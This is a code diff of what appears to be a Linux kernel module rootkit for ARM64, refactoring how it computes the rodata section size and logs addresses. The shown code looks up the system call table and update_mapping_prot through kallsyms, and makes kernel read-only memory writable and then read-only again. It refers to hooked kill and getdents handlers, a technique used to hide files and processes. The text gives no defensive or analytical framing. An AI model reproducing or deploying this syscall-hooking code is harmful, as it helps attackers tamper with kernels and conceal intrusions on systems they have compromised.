@@ -33,7 +33,6 @@ static unsigned long *__sys_call_table;
 static void (*update_mapping_prot)(unsigned long, unsigned long, unsigned long, unsigned long);
 static unsigned long start_rodata;
 static unsigned long init_begin;
-#define section_size (init_begin - start_rodata)
 
 typedef asmlinkage unsigned long (*orgin_syscall)(const struct pt_regs *);
 static orgin_syscall orig_kill;
@@ -58,11 +57,10 @@ static unsigned long *get_syscall_table(void)
 	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
 	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
 
-	printk(KERN_INFO "sys_call_table at %p\n", syscall_table);
-	printk(KERN_INFO "update_mapping_prot at %p\n", update_mapping_prot);
+	printk(KERN_INFO "sys_call_table at: %p\n", syscall_table);
+	printk(KERN_INFO "update_mapping_prot at: %p\n", update_mapping_prot);
 	printk(KERN_INFO "start_rodata: %lx\n", start_rodata);
 	printk(KERN_INFO "init_begin: %lx\n", init_begin);
-	printk(KERN_INFO "section_size: %lx\n", section_size);
 	return syscall_table;
 }
 
@@ -106,13 +104,13 @@ static asmlinkage int hook_getdents(const struct pt_regs *regs)
 static inline void protect_memory(void)
 {
 	// physical address of the start of the rodata section
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, pgprot_val(PAGE_KERNEL_RO));
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, pgprot_val(PAGE_KERNEL_RO));
 	printk(KERN_INFO "Protected\n");
 }
 
 static inline void unprotect_memory(void)
 {
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, pgprot_val(PAGE_KERNEL));
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, pgprot_val(PAGE_KERNEL));
 	printk(KERN_INFO "Unprotected\n");
 }
 //-----------------------------------------------------------------------------------
